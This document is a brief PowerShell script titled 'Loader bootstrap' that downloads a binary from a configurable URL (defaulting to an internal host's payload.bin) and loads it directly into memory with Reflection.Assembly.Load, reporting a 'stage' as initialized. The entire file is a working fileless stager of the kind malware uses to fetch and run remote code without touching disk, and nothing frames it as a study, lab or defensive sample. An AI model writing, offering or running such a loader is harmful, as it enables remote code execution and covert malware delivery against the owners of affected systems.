
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://internal.corp:8080/payload.bin"
)
try { $StageBytes = (New-Object System.Net.WebClient).DownloadData($DownloadUrl); [Reflection.Assembly]::Load($StageBytes); Write-Output "stage 8 initialized" } catch { Write-Warning "Remote fetch failed" }
